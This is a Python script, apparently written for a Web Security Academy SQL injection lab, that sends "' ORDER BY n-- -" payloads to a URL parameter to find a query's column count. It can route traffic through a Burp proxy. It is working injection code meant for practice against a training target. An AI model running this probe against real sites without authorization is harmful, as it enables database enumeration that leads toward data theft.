# src/sqli/lab03.py
from __future__ import annotations

import argparse
import sys
from typing import Final

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi Lab03: Discover number of columns via ORDER BY injection."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # where/how to inject
    _ = p.add_argument("--endpoint", default="/filter", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument(
        "--param-name", default="category", help="Parameter to inject (default: %(default)s)"
    )
    _ = p.add_argument(
        "--base-value",
        default="Gifts",
        help="Benign base value for the parameter before the payload (default: %(default)s)",
    )
    _ = p.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method (default: %(default)s)",
    )
    _ = p.add_argument(
        "--inject",
        choices=["query", "body"],
        default="query",
        help="Where to put payload (default: %(default)s)",
    )

    # detection knobs
    _ = p.add_argument(
        "--error-marker",
        default="Internal Server Error",
        help="Substring that indicates an error page (default: %(default)s)",
    )
    _ = p.add_argument(
        "--expect-ok-status",
        type=int,
        default=200,
        help="HTTP status considered OK/normal (default: %(default)s)",
    )

    # search bounds
    _ = p.add_argument(
        "--start", type=int, default=1, help="Start column index (default: %(default)s)"
    )
    _ = p.add_argument(
        "--max", type=int, default=50, help="Max columns to try (default: %(default)s)"
    )

    # plumbing
    _ = p.add_argument(
        "--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)"
    )
    _ = p.add_argument(
        "--insecure", action="store_true", help="Disable TLS verification (useful with Burp)."
    )
    _ = p.add_argument(
        "--timeout", type=float, default=10.0, help="HTTP timeout (s, default: %(default)s)"
    )

    # pass-through
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")
    _ = p.add_argument(
        "--base-param",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Additional baseline params (repeatable). Applies to query/body.",
    )

    return p.parse_args(argv)


def find_column_count(
    client: HttpClient,
    *,
    endpoint: str,
    param_name: str,
    base_value: str,
    method: str,
    inject: str,
    base_params: dict[str, str],
    cookies: dict[str, str],
    headers: dict[str, str],
    start: int,
    max_try: int,
    expect_ok_status: int | None,
    error_marker: str | None,
) -> tuple[int | None, int]:
    """
    Iterate ORDER BY n until we hit an error.
    Returns (column_count, attempts).
      - column_count: None if no error encountered within bounds.
      - attempts: number of requests performed.
    """
    attempts = 0
    for i in range(start, max_try + 1):
        attempts += 1

        # Build payload: <base_value>' ORDER BY i-- -
        payload = f"{base_value}' ORDER BY {i}-- -"

        res = sqli_inject(
            client,
            payload=payload,
            method=method,  # "GET" or "POST"
            endpoint=endpoint,
            inject=inject,  # "query" or "body"
            param_name=param_name,
            base_params=base_params,
            extra_headers=headers,
            cookies=cookies,
            # Use status to detect "normal" vs "error" quickly.
            # We'll also look for an error marker in the body excerpt below.
            expect_status=expect_ok_status,
        )

        # If sqli_inject returned "success" based on status, we *still* check for an error marker
        # in the body excerpt (useful if server error returns 200 with an error page).
        status_ok = (expect_ok_status is None) or (res.status_code == expect_ok_status)
        body_has_error = bool(error_marker) and (error_marker in (res.evidence_excerpt or ""))

        if (not status_ok) or body_has_error:
            # First failure at i => number of columns is i-1
            return (i - 1 if i > start else 0), attempts

    return (None, attempts)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    # Normalize collections
    cookies = parse_keyvals(args.cookie, "=")
    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    # Ensure we don't accidentally overwrite the injected param in base_params
    # (the injected param value is built inside the loop).
    if args.param_name in base_params:
        base_params.pop(args.param_name, None)

    print("[+] Probing to determine the number of columns with ORDER BY...")

    try:
        count, attempts = find_column_count(
            client,
            endpoint=args.endpoint,
            param_name=args.param_name,
            base_value=args.base_value,
            method=args.method,
            inject=args.inject,
            base_params=base_params,
            cookies=cookies,
            headers=headers,
            start=args.start,
            max_try=args.max,
            expect_ok_status=args.expect_ok_status,
            error_marker=args.error_marker,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if count is None:
        print("[-] Could not determine the column count within the given range.")
        print(f"    Tried: {args.start}..{args.max} ({attempts} requests)")
        return 1

    print(f"[+] The number of columns is {count}.")
    print(f"    Attempts: {attempts}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab03 \
# https://TARGET.web-security-academy.net \
# --endpoint /filter \
# --param-name category \
# --base-value Gifts \
# --proxy http://127.0.0.1:8080 \
# --insecure
